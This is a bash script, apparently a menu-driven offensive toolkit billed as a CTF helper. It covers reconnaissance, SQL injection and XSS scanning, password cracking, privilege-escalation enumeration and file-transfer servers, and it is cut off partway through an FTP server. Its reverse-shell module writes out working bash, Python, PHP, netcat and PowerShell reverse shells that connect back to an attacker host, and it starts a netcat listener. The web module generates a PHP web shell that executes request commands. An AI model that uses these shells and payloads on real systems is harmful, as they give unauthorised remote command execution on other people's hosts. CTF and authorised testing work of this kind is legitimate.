#!/bin/bash

#=============================================================================
# Cornedry CTF EDITION - Enhanced for Maximum Efficiency
# Optimized for Capture The Flag competitions
#=============================================================================

# COLOR PANEL
RESET="$(tput sgr0)"
BOLD="$(tput bold)"
RED="$(tput setaf 1)"
GREEN="$(tput setaf 2)"
YELLOW="$(tput setaf 3)"
BLUE="$(tput setaf 6)"
GRAY="$(tput setaf 8)"
BRIGHT_RED="${BOLD}$(tput setaf 1)"
BRIGHT_GREEN="${BOLD}$(tput setaf 2)"
BRIGHT_BLUE="${BOLD}$(tput setaf 6)"
BRIGHT_YELLOW="${BOLD}$(tput setaf 3)"

# CTF WORKSPACE SETUP
CTF_ROOT="$HOME/ctf_workspace"
CTF_LOGS="$CTF_ROOT/logs"
CTF_LOOT="$CTF_ROOT/loot"
CTF_SCANS="$CTF_ROOT/scans"
CTF_EXPLOITS="$CTF_ROOT/exploits"
CTF_NOTES="$CTF_ROOT/notes"
CTF_TOOLS="$HOME/tools"

# Initialize workspace
init_workspace() {
    mkdir -p "$CTF_LOGS" "$CTF_LOOT" "$CTF_SCANS" "$CTF_EXPLOITS" "$CTF_NOTES" "$CTF_TOOLS"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] CTF Session Started" >> "$CTF_LOGS/session.log"
}

# Logging function
log_action() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$CTF_LOGS/session.log"
}

# Auto-save results
save_result() {
    local tool_name=$1
    local target=$2
    local output_file="$CTF_SCANS/${tool_name}_${target//[.:\/]/_}_$(date +%s).txt"
    cat > "$output_file"
    echo -e "${BRIGHT_GREEN}[✓]${RESET} Results saved: $output_file"
    log_action "Saved results: $output_file"
}

# Quick target setter
set_target() {
    if [ -z "$CTF_TARGET" ]; then
        read -rp "${BRIGHT_YELLOW}[?]${RESET} Set target IP/domain: " CTF_TARGET
        export CTF_TARGET
        log_action "Target set: $CTF_TARGET"
        echo -e "${BRIGHT_GREEN}[✓]${RESET} Target: ${BRIGHT_BLUE}$CTF_TARGET${RESET}"
    else
        echo -e "${BRIGHT_BLUE}[i]${RESET} Current target: ${BRIGHT_BLUE}$CTF_TARGET${RESET}"
        read -rp "Change target? (y/N): " change
        if [[ $change =~ ^[Yy]$ ]]; then
            read -rp "${BRIGHT_YELLOW}[?]${RESET} New target: " CTF_TARGET
            export CTF_TARGET
            log_action "Target changed to: $CTF_TARGET"
        fi
    fi
}

# Quick LHOST setter
set_lhost() {
    if [ -z "$CTF_LHOST" ]; then
        # Auto-detect local IP
        CTF_LHOST=$(ip route get 1.1.1.1 | grep -oP 'src \K\S+' 2>/dev/null || hostname -I | awk '{print $1}')
        echo -e "${BRIGHT_BLUE}[i]${RESET} Auto-detected LHOST: ${BRIGHT_BLUE}$CTF_LHOST${RESET}"
        read -rp "Use this? (Y/n): " confirm
        if [[ $confirm =~ ^[Nn]$ ]]; then
            read -rp "${BRIGHT_YELLOW}[?]${RESET} Enter LHOST: " CTF_LHOST
        fi
        export CTF_LHOST
        log_action "LHOST set: $CTF_LHOST"
    else
        echo -e "${BRIGHT_BLUE}[i]${RESET} Current LHOST: ${BRIGHT_BLUE}$CTF_LHOST${RESET}"
    fi
}

# ASCII Art (compact version)
show_banner() {
    clear
    echo -e "${BRIGHT_RED}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                               								║
║     █████████                                         ██████████                       		║
║    ███░░░░░███                                       ░░███░░░░███                      		║
║   ███     ░░░   ██████  ████████  ████████    ██████  ░███   ░░███ ████████  █████ ████		║
║  ░███          ███░░███░░███░░███░░███░░███  ███░░███ ░███    ░███░░███░░███░░███ ░███ 		║
║  ░███         ░███ ░███ ░███ ░░░  ░███ ░███ ░███████  ░███    ░███ ░███ ░░░  ░███ ░███ 		║
║  ░░███     ███░███ ░███ ░███      ░███ ░███ ░███░░░   ░███    ███  ░███      ░███ ░███ 		║
║   ░░█████████ ░░██████  █████     ████ █████░░██████  ██████████   █████     ░░███████ 		║
║    ░░░░░░░░░   ░░░░░░  ░░░░░     ░░░░ ░░░░░  ░░░░░░  ░░░░░░░░░░   ░░░░░       ░░░░░███ 		║
║                                                                             ███ ░███ 			║
║                                                                            ░░██████  			║
║                                                                             ░░░░░░      		║     														  			   																				 
║                                                               								║
║                    AUTO SETUP SCRIPT                          								║
║                  Preparing for CTF domination                 								║
║                                                                								║
╚═══════════════════════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${RESET}"
    echo -e "    ${BRIGHT_BLUE}═══════════════════════════════════════════════════════════════════════${RESET}"
    echo -e "    ${BRIGHT_RED}CTF EDITION${RESET} | Optimized for Maximum Speed | Creator: ${BRIGHT_BLUE}Melvin PETIT${RESET}"
    echo -e "    ${BRIGHT_BLUE}═══════════════════════════════════════════════════════════════════════${RESET}"
    echo ""
    [ -n "$CTF_TARGET" ] && echo -e "    ${BRIGHT_GREEN}[◆]${RESET} Target: ${BRIGHT_BLUE}$CTF_TARGET${RESET}"
    [ -n "$CTF_LHOST" ] && echo -e "    ${BRIGHT_GREEN}[◆]${RESET} LHOST: ${BRIGHT_BLUE}$CTF_LHOST${RESET}"
    echo -e "    ${BRIGHT_GREEN}[◆]${RESET} Workspace: ${BRIGHT_BLUE}$CTF_ROOT${RESET}"
    echo ""
}

# Enhanced tool checker with silent install option
check_tool() {
    local tool_name=$1
    local install_cmd=$2
    local silent=${3:-false}
    
    if ! command -v "$tool_name" &> /dev/null; then
        if [ "$silent" = "true" ]; then
            echo -e "${BRIGHT_YELLOW}[!]${RESET} Installing $tool_name..."
            eval "$install_cmd" > /dev/null 2>&1
            if command -v "$tool_name" &> /dev/null; then
                echo -e "${BRIGHT_GREEN}[✓]${RESET} $tool_name installed"
                return 0
            else
                echo -e "${BRIGHT_RED}[✗]${RESET} Failed to install $tool_name"
                return 1
            fi
        else
            echo -e "${BRIGHT_RED}[!]${RESET} $tool_name not found"
            read -rp "Install now? (Y/n): " install
            if [[ ! $install =~ ^[Nn]$ ]]; then
                eval "$install_cmd"
                command -v "$tool_name" &> /dev/null && return 0 || return 1
            fi
            return 1
        fi
    fi
    return 0
}

#=============================================================================
# QUICK RECON MODULE - Fast enumeration
#=============================================================================
quick_recon() {
    show_banner
    echo -e "${BRIGHT_RED}"
    echo "      ╔═══════════════════════════════════════╗"
    echo "      ║     ${BRIGHT_BLUE}▓▒░   QUICK RECON   ░▒▓${BRIGHT_RED}     ║"
    echo "      ╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
    
    set_target
    
    echo -e "\n${BRIGHT_YELLOW}[1]${RESET} Quick Port Scan (Top 1000)"
    echo -e "${BRIGHT_YELLOW}[2]${RESET} Full Port Scan (All ports)"
    echo -e "${BRIGHT_YELLOW}[3]${RESET} Service Version Detection"
    echo -e "${BRIGHT_YELLOW}[4]${RESET} Web Enumeration Suite"
    echo -e "${BRIGHT_YELLOW}[5]${RESET} UDP Scan (Top 100)"
    echo -e "${BRIGHT_YELLOW}[6]${RESET} Subdomain Enumeration"
    echo -e "${BRIGHT_YELLOW}[7]${RESET} All-in-One Quick Scan"
    echo -e "${BRIGHT_YELLOW}[0]${RESET} Back"
    echo ""
    
    read -rp "${BRIGHT_BLUE}$(whoami)@Cornedry${RESET}${BRIGHT_RED}>${RESET} " choice
    
    case $choice in
        1)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Quick scan on $CTF_TARGET..."
            check_tool "nmap" "sudo apt-get install -y nmap" true
            nmap -T4 -F "$CTF_TARGET" -oN "$CTF_SCANS/quick_${CTF_TARGET//[.:\/]/_}.txt" | tee >(tail -n +1)
            ;;
        2)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Full port scan on $CTF_TARGET..."
            check_tool "nmap" "sudo apt-get install -y nmap" true
            nmap -T4 -p- "$CTF_TARGET" -oN "$CTF_SCANS/fullscan_${CTF_TARGET//[.:\/]/_}.txt" | tee >(tail -n +1)
            ;;
        3)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Service detection on $CTF_TARGET..."
            check_tool "nmap" "sudo apt-get install -y nmap" true
            nmap -T4 -sV -sC "$CTF_TARGET" -oN "$CTF_SCANS/services_${CTF_TARGET//[.:\/]/_}.txt" | tee >(tail -n +1)
            ;;
        4)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Web enumeration suite..."
            
            # Whatweb
            if check_tool "whatweb" "sudo apt-get install -y whatweb" true; then
                whatweb "$CTF_TARGET" | tee "$CTF_SCANS/whatweb_${CTF_TARGET//[.:\/]/_}.txt"
            fi
            
            # Nikto
            if check_tool "nikto" "sudo apt-get install -y nikto" true; then
                nikto -h "$CTF_TARGET" -o "$CTF_SCANS/nikto_${CTF_TARGET//[.:\/]/_}.txt"
            fi
            
            # Dirb
            if check_tool "dirb" "sudo apt-get install -y dirb" true; then
                dirb "http://$CTF_TARGET" -o "$CTF_SCANS/dirb_${CTF_TARGET//[.:\/]/_}.txt"
            fi
            ;;
        5)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} UDP scan on $CTF_TARGET..."
            check_tool "nmap" "sudo apt-get install -y nmap" true
            sudo nmap -sU -F "$CTF_TARGET" -oN "$CTF_SCANS/udp_${CTF_TARGET//[.:\/]/_}.txt" | tee >(tail -n +1)
            ;;
        6)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Subdomain enumeration..."
            
            # Sublist3r
            if [ -d "$CTF_TOOLS/Sublist3r" ] || check_tool "sublist3r" "sudo apt-get install -y sublist3r" true; then
                subfinder -d "$CTF_TARGET" -o "$CTF_SCANS/subdomains_${CTF_TARGET//[.:\/]/_}.txt"
            fi
            ;;
        7)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} ALL-IN-ONE SCAN on $CTF_TARGET..."
            echo -e "${BRIGHT_YELLOW}[!]${RESET} This will take several minutes...\n"
            
            # Quick port scan
            echo -e "${BRIGHT_BLUE}[→]${RESET} Phase 1: Quick port scan..."
            nmap -T4 -F "$CTF_TARGET" -oN "$CTF_SCANS/phase1_quick.txt"
            
            # Service detection
            echo -e "${BRIGHT_BLUE}[→]${RESET} Phase 2: Service detection..."
            nmap -T4 -sV -sC "$CTF_TARGET" -oN "$CTF_SCANS/phase2_services.txt"
            
            # Web enum if port 80/443 open
            if grep -q "80/tcp\|443/tcp" "$CTF_SCANS/phase2_services.txt"; then
                echo -e "${BRIGHT_BLUE}[→]${RESET} Phase 3: Web enumeration..."
                whatweb "$CTF_TARGET" > "$CTF_SCANS/phase3_whatweb.txt" 2>&1
                dirb "http://$CTF_TARGET" -o "$CTF_SCANS/phase3_dirb.txt" -w
            fi
            
            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} All-in-one scan complete! Check $CTF_SCANS/"
            ;;
        0)
            return
            ;;
    esac
    
    echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Scan complete!"
    read -rp "Press Enter to continue..."
}

#=============================================================================
# WEB EXPLOITATION MODULE
#=============================================================================
web_exploit() {
    show_banner
    echo -e "${BRIGHT_RED}"
    echo "      ╔═══════════════════════════════════════╗"
    echo "      ║   ${BRIGHT_BLUE}▓▒░   WEB EXPLOITATION   ░▒▓${BRIGHT_RED}   ║"
    echo "      ╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
    
    set_target
    
    echo -e "\n${BRIGHT_YELLOW}[1]${RESET} Directory Brute Force (Gobuster)"
    echo -e "${BRIGHT_YELLOW}[2]${RESET} SQL Injection (SQLMap)"
    echo -e "${BRIGHT_YELLOW}[3]${RESET} XSS Scanner (XSStrike)"
    echo -e "${BRIGHT_YELLOW}[4]${RESET} LFI/RFI Fuzzer"
    echo -e "${BRIGHT_YELLOW}[5]${RESET} WordPress Scanner (WPScan)"
    echo -e "${BRIGHT_YELLOW}[6]${RESET} Web Shell Upload"
    echo -e "${BRIGHT_YELLOW}[7]${RESET} Burp Suite Integration"
    echo -e "${BRIGHT_YELLOW}[0]${RESET} Back"
    echo ""
    
    read -rp "${BRIGHT_BLUE}$(whoami)@Cornedry${RESET}${BRIGHT_RED}>${RESET} " choice
    
    case $choice in
        1)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Directory brute force..."
            if check_tool "gobuster" "sudo apt-get install -y gobuster" true; then
                read -rp "Wordlist (default: /usr/share/wordlists/dirb/common.txt): " wordlist
                wordlist=${wordlist:-/usr/share/wordlists/dirb/common.txt}
                gobuster dir -u "http://$CTF_TARGET" -w "$wordlist" -o "$CTF_SCANS/gobuster_${CTF_TARGET//[.:\/]/_}.txt" -q
            fi
            ;;
        2)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} SQL Injection scan..."
            if check_tool "sqlmap" "sudo apt-get install -y sqlmap" true; then
                read -rp "Target URL with parameter: " url
                sqlmap -u "$url" --batch --random-agent --threads=5 --output-dir="$CTF_SCANS/sqlmap"
            fi
            ;;
        3)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} XSS scan..."
            if [ ! -d "$CTF_TOOLS/XSStrike" ]; then
                git clone https://github.com/s0md3v/XSStrike.git "$CTF_TOOLS/XSStrike"
                pip3 install -r "$CTF_TOOLS/XSStrike/requirements.txt"
            fi
            read -rp "Target URL: " url
            python3 "$CTF_TOOLS/XSStrike/xsstrike.py" -u "$url" --crawl
            ;;
        4)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} LFI/RFI Fuzzer..."
            if check_tool "ffuf" "sudo apt-get install -y ffuf" true; then
                read -rp "Target URL (use FUZZ for injection point): " url
                ffuf -u "$url" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -o "$CTF_SCANS/lfi_results.json"
            fi
            ;;
        5)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} WordPress scan..."
            if ! command -v wpscan &> /dev/null; then
                sudo gem install wpscan
            fi
            wpscan --url "http://$CTF_TARGET" --enumerate vp,vt,u --output "$CTF_SCANS/wpscan_${CTF_TARGET//[.:\/]/_}.txt"
            ;;
        6)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Generating PHP web shell..."
            cat > "$CTF_EXPLOITS/shell.php" << 'SHELL'
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>
SHELL
            echo -e "${BRIGHT_GREEN}[✓]${RESET} Web shell created: $CTF_EXPLOITS/shell.php"
            echo -e "${BRIGHT_BLUE}[i]${RESET} Usage: http://target/shell.php?cmd=whoami"
            ;;
        7)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Starting Burp Suite proxy setup..."
            echo -e "${BRIGHT_BLUE}[i]${RESET} Configure your browser to use proxy: 127.0.0.1:8080"
            echo -e "${BRIGHT_BLUE}[i]${RESET} Starting Burp Suite..."
            burpsuite &
            ;;
    esac
    
    read -rp "Press Enter to continue..."
}

#=============================================================================
# REVERSE SHELL GENERATOR
#=============================================================================
reverse_shell_gen() {
    show_banner
    echo -e "${BRIGHT_RED}"
    echo "      ╔═══════════════════════════════════════╗"
    echo "      ║  ${BRIGHT_BLUE}▓▒░   REVERSE SHELLS   ░▒▓${BRIGHT_RED}    ║"
    echo "      ╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
    
    set_lhost
    read -rp "LPORT (default: 4444): " lport
    lport=${lport:-4444}
    
    echo -e "\n${BRIGHT_YELLOW}[1]${RESET} Bash Reverse Shell"
    echo -e "${BRIGHT_YELLOW}[2]${RESET} Python Reverse Shell"
    echo -e "${BRIGHT_YELLOW}[3]${RESET} PHP Reverse Shell"
    echo -e "${BRIGHT_YELLOW}[4]${RESET} Netcat Reverse Shell"
    echo -e "${BRIGHT_YELLOW}[5]${RESET} PowerShell Reverse Shell"
    echo -e "${BRIGHT_YELLOW}[6]${RESET} Generate All + Start Listener"
    echo -e "${BRIGHT_YELLOW}[0]${RESET} Back"
    echo ""
    
    read -rp "${BRIGHT_BLUE}$(whoami)@Cornedry${RESET}${BRIGHT_RED}>${RESET} " choice
    
    case $choice in
        1)
            echo "bash -i >& /dev/tcp/$CTF_LHOST/$lport 0>&1" | tee "$CTF_EXPLOITS/bash_shell.sh"
            echo -e "${BRIGHT_GREEN}[✓]${RESET} Bash shell saved to: $CTF_EXPLOITS/bash_shell.sh"
            ;;
        2)
            cat > "$CTF_EXPLOITS/python_shell.py" << PYSHELL
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$CTF_LHOST",$lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
PYSHELL
            echo -e "${BRIGHT_GREEN}[✓]${RESET} Python shell saved to: $CTF_EXPLOITS/python_shell.py"
            ;;
        3)
            cat > "$CTF_EXPLOITS/php_shell.php" << PHPSHELL
<?php
\$sock=fsockopen("$CTF_LHOST",$lport);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
PHPSHELL
            echo -e "${BRIGHT_GREEN}[✓]${RESET} PHP shell saved to: $CTF_EXPLOITS/php_shell.php"
            ;;
        4)
            echo "nc -e /bin/sh $CTF_LHOST $lport" | tee "$CTF_EXPLOITS/nc_shell.sh"
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $CTF_LHOST $lport >/tmp/f" | tee -a "$CTF_EXPLOITS/nc_shell.sh"
            echo -e "${BRIGHT_GREEN}[✓]${RESET} Netcat shells saved to: $CTF_EXPLOITS/nc_shell.sh"
            ;;
        5)
            cat > "$CTF_EXPLOITS/powershell_shell.ps1" << PSSHELL
\$client = New-Object System.Net.Sockets.TCPClient("$CTF_LHOST",$lport);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String );
    \$sendback2 = \$sendback + "PS " + (pwd).Path + "> ";
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
    \$stream.Flush()
}
\$client.Close()
PSSHELL
            echo -e "${BRIGHT_GREEN}[✓]${RESET} PowerShell shell saved to: $CTF_EXPLOITS/powershell_shell.ps1"
            ;;
        6)
            # Generate all shells
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Generating all reverse shells..."
            
            echo "bash -i >& /dev/tcp/$CTF_LHOST/$lport 0>&1" > "$CTF_EXPLOITS/bash_shell.sh"
            
            cat > "$CTF_EXPLOITS/python_shell.py" << PYSHELL
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$CTF_LHOST",$lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
PYSHELL
            
            cat > "$CTF_EXPLOITS/php_shell.php" << PHPSHELL
<?php
\$sock=fsockopen("$CTF_LHOST",$lport);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
PHPSHELL
            
            echo -e "${BRIGHT_GREEN}[✓]${RESET} All shells generated in: $CTF_EXPLOITS/"
            
            # Start listener
            echo -e "\n${BRIGHT_YELLOW}[!]${RESET} Starting listener on port $lport..."
            echo -e "${BRIGHT_BLUE}[i]${RESET} Use Ctrl+C to stop listener"
            nc -lvnp $lport
            ;;
    esac
    
    if [ "$choice" != "6" ]; then
        echo -e "\n${BRIGHT_YELLOW}[?]${RESET} Start listener on port $lport? (Y/n)"
        read -rp "> " start_listener
        if [[ ! $start_listener =~ ^[Nn]$ ]]; then
            echo -e "${BRIGHT_GREEN}[◆]${RESET} Starting listener..."
            nc -lvnp $lport
        fi
    fi
    
    read -rp "Press Enter to continue..."
}

#=============================================================================
# PRIVILEGE ESCALATION
#=============================================================================
priv_esc() {
    show_banner
    echo -e "${BRIGHT_RED}"
    echo "      ╔═══════════════════════════════════════╗"
    echo "      ║  ${BRIGHT_BLUE}▓▒░   PRIV ESCALATION   ░▒▓${BRIGHT_RED}  ║"
    echo "      ╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "\n${BRIGHT_YELLOW}[1]${RESET} LinPEAS (Linux)"
    echo -e "${BRIGHT_YELLOW}[2]${RESET} Linux Smart Enumeration"
    echo -e "${BRIGHT_YELLOW}[3]${RESET} SUID Binary Check"
    echo -e "${BRIGHT_YELLOW}[4]${RESET} Sudo -l Parser"
    echo -e "${BRIGHT_YELLOW}[5]${RESET} Capabilities Check"
    echo -e "${BRIGHT_YELLOW}[6]${RESET} Download All Scripts"
    echo -e "${BRIGHT_YELLOW}[0]${RESET} Back"
    echo ""
    
    read -rp "${BRIGHT_BLUE}$(whoami)@Cornedry${RESET}${BRIGHT_RED}>${RESET} " choice
    
    case $choice in
        1)
            if [ ! -f "$CTF_TOOLS/linpeas.sh" ]; then
                echo -e "${BRIGHT_GREEN}[◆]${RESET} Downloading LinPEAS..."
                curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o "$CTF_TOOLS/linpeas.sh"
                chmod +x "$CTF_TOOLS/linpeas.sh"
            fi
            echo -e "${BRIGHT_GREEN}[✓]${RESET} LinPEAS available at: $CTF_TOOLS/linpeas.sh"
            echo -e "${BRIGHT_BLUE}[i]${RESET} Transfer to target and run"
            read -rp "Run locally? (y/N): " run
            if [[ $run =~ ^[Yy]$ ]]; then
                "$CTF_TOOLS/linpeas.sh" | tee "$CTF_LOOT/linpeas_output.txt"
            fi
            ;;
        2)
            if [ ! -f "$CTF_TOOLS/lse.sh" ]; then
                echo -e "${BRIGHT_GREEN}[◆]${RESET} Downloading LSE..."
                curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o "$CTF_TOOLS/lse.sh"
                chmod +x "$CTF_TOOLS/lse.sh"
            fi
            echo -e "${BRIGHT_GREEN}[✓]${RESET} LSE available at: $CTF_TOOLS/lse.sh"
            read -rp "Run locally? (y/N): " run
            if [[ $run =~ ^[Yy]$ ]]; then
                "$CTF_TOOLS/lse.sh" -l 2 | tee "$CTF_LOOT/lse_output.txt"
            fi
            ;;
        3)
            echo -e "${BRIGHT_GREEN}[◆]${RESET} Checking SUID binaries..."
            find / -perm -4000 2>/dev/null | tee "$CTF_LOOT/suid_binaries.txt"
            echo -e "\n${BRIGHT_BLUE}[i]${RESET} Check GTFOBins: https://gtfobins.github.io/"
            ;;
        4)
            echo -e "${BRIGHT_GREEN}[◆]${RESET} Checking sudo permissions..."
            sudo -l | tee "$CTF_LOOT/sudo_perms.txt"
            ;;
        5)
            echo -e "${BRIGHT_GREEN}[◆]${RESET} Checking capabilities..."
            getcap -r / 2>/dev/null | tee "$CTF_LOOT/capabilities.txt"
            ;;
        6)
            echo -e "${BRIGHT_GREEN}[◆]${RESET} Downloading all enumeration scripts..."
            
            curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o "$CTF_TOOLS/linpeas.sh"
            curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o "$CTF_TOOLS/lse.sh"
            
            chmod +x "$CTF_TOOLS/"*.sh
            
            echo -e "${BRIGHT_GREEN}[✓]${RESET} All scripts downloaded to: $CTF_TOOLS/"
            ;;
    esac
    
    read -rp "Press Enter to continue..."
}

#=============================================================================
# PASSWORD CRACKING
#=============================================================================
password_crack() {
    show_banner
    echo -e "${BRIGHT_RED}"
    echo "      ╔═══════════════════════════════════════╗"
    echo "      ║  ${BRIGHT_BLUE}▓▒░   PASSWORD CRACKING   ░▒▓${BRIGHT_RED} ║"
    echo "      ╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "\n${BRIGHT_YELLOW}[1]${RESET} John the Ripper (Fast)"
    echo -e "${BRIGHT_YELLOW}[2]${RESET} Hashcat (GPU)"
    echo -e "${BRIGHT_YELLOW}[3]${RESET} Hydra (Network)"
    echo -e "${BRIGHT_YELLOW}[4]${RESET} Hash Identifier"
    echo -e "${BRIGHT_YELLOW}[5]${RESET} CrackStation Lookup"
    echo -e "${BRIGHT_YELLOW}[0]${RESET} Back"
    echo ""
    
    read -rp "${BRIGHT_BLUE}$(whoami)@Cornedry${RESET}${BRIGHT_RED}>${RESET} " choice
    
    case $choice in
        1)
            check_tool "john" "sudo apt-get install -y john" true
            read -rp "Hash file path: " hashfile
            read -rp "Wordlist (default: rockyou): " wordlist
            wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
            
            if [ ! -f "$wordlist" ] && [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
                echo -e "${BRIGHT_YELLOW}[!]${RESET} Extracting rockyou..."
                sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
            fi
            
            john --wordlist="$wordlist" "$hashfile" | tee "$CTF_LOOT/john_$(basename $hashfile).txt"
            echo -e "\n${BRIGHT_GREEN}[✓]${RESET} Cracked passwords:"
            john --show "$hashfile"
            ;;
        2)
            check_tool "hashcat" "sudo apt-get install -y hashcat" true
            read -rp "Hash file path: " hashfile
            read -rp "Hash mode (0=MD5, 1000=NTLM, 1400=SHA256): " mode
            read -rp "Wordlist: " wordlist
            
            hashcat -m "$mode" -a 0 "$hashfile" "$wordlist" --outfile="$CTF_LOOT/hashcat_cracked.txt"
            ;;
        3)
            check_tool "hydra" "sudo apt-get install -y hydra" true
            set_target
            
            echo -e "\n${BRIGHT_BLUE}[i]${RESET} Service options:"
            echo "  ssh, ftp, http-post-form, rdp, smb, etc."
            read -rp "Service: " service
            read -rp "Username: " user
            read -rp "Password list: " passlist
            
            hydra -l "$user" -P "$passlist" "$CTF_TARGET" "$service" -t 4 | tee "$CTF_LOOT/hydra_${service}.txt"
            ;;
        4)
            read -rp "Enter hash to identify: " hash
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Hash analysis:"
            
            # Length-based identification
            len=${#hash}
            echo "Length: $len characters"
            
            case $len in
                32) echo -e "${BRIGHT_BLUE}Possible:${RESET} MD5, MD4, MD2, NTLM" ;;
                40) echo -e "${BRIGHT_BLUE}Possible:${RESET} SHA-1, MySQL5" ;;
                64) echo -e "${BRIGHT_BLUE}Possible:${RESET} SHA-256" ;;
                96) echo -e "${BRIGHT_BLUE}Possible:${RESET} SHA-384" ;;
                128) echo -e "${BRIGHT_BLUE}Possible:${RESET} SHA-512" ;;
                *) echo -e "${BRIGHT_YELLOW}Unknown format${RESET}" ;;
            esac
            
            # Online lookup suggestion
            echo -e "\n${BRIGHT_BLUE}[i]${RESET} Try online: https://hashes.com/en/decrypt/hash"
            ;;
        5)
            read -rp "Enter hash: " hash
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Looking up hash online..."
            
            # Save for later lookup
            echo "$hash" >> "$CTF_LOOT/hashes_to_lookup.txt"
            echo -e "${BRIGHT_BLUE}[i]${RESET} Hash saved. Visit: https://crackstation.net/"
            echo -e "${BRIGHT_BLUE}[i]${RESET} Or: https://hashes.com/en/decrypt/hash"
            ;;
    esac
    
    read -rp "Press Enter to continue..."
}

#=============================================================================
# FILE TRANSFER SERVER
#=============================================================================
file_server() {
    show_banner
    echo -e "${BRIGHT_RED}"
    echo "      ╔═══════════════════════════════════════╗"
    echo "      ║  ${BRIGHT_BLUE}▓▒░   FILE TRANSFER   ░▒▓${BRIGHT_RED}    ║"
    echo "      ╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
    
    set_lhost
    
    echo -e "\n${BRIGHT_YELLOW}[1]${RESET} HTTP Server (Python)"
    echo -e "${BRIGHT_YELLOW}[2]${RESET} SMB Server"
    echo -e "${BRIGHT_YELLOW}[3]${RESET} FTP Server"
    echo -e "${BRIGHT_YELLOW}[4]${RESET} Generate Download Commands"
    echo -e "${BRIGHT_YELLOW}[0]${RESET} Back"
    echo ""
    
    read -rp "${BRIGHT_BLUE}$(whoami)@Cornedry${RESET}${BRIGHT_RED}>${RESET} " choice
    
    case $choice in
        1)
            read -rp "Port (default: 8000): " port
            port=${port:-8000}
            read -rp "Directory to serve (default: current): " dir
            dir=${dir:-.}
            
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Starting HTTP server..."
            echo -e "${BRIGHT_BLUE}[i]${RESET} Server: http://$CTF_LHOST:$port/"
            echo -e "${BRIGHT_BLUE}[i]${RESET} Download with: wget http://$CTF_LHOST:$port/file"
            echo -e "${BRIGHT_BLUE}[i]${RESET} Or: curl -O http://$CTF_LHOST:$port/file"
            echo ""
            cd "$dir" && python3 -m http.server $port
            ;;
        2)
            if ! command -v impacket-smbserver &> /dev/null; then
                echo -e "${BRIGHT_YELLOW}[!]${RESET} Installing impacket..."
                pip3 install impacket
            fi
            
            read -rp "Share name (default: share): " share
            share=${share:-share}
            read -rp "Directory to share (default: current): " dir
            dir=${dir:-.}
            
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Starting SMB server..."
            echo -e "${BRIGHT_BLUE}[i]${RESET} Windows: net use \\\\$CTF_LHOST\\$share"
            echo -e "${BRIGHT_BLUE}[i]${RESET} Copy: copy \\\\$CTF_LHOST\\$share\\file.txt ."
            echo ""
            impacket-smbserver "$share" "$dir" -smb2support
            ;;
        3)
            echo -e "${BRIGHT_GREEN}[◆]${RESET} Starting Python FTP server..."
            
            cat > /tmp/ftp_server.py << 'FTPSERVER'
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()
authorizer.add_user("user", "pass", ".", perm="elradfmw")
authorizer.add_anonymous(".")

handler = FTPHandler
handler.authorizer = authorizer

server = FTPServer(("0.0.0.0", 2121), handler)
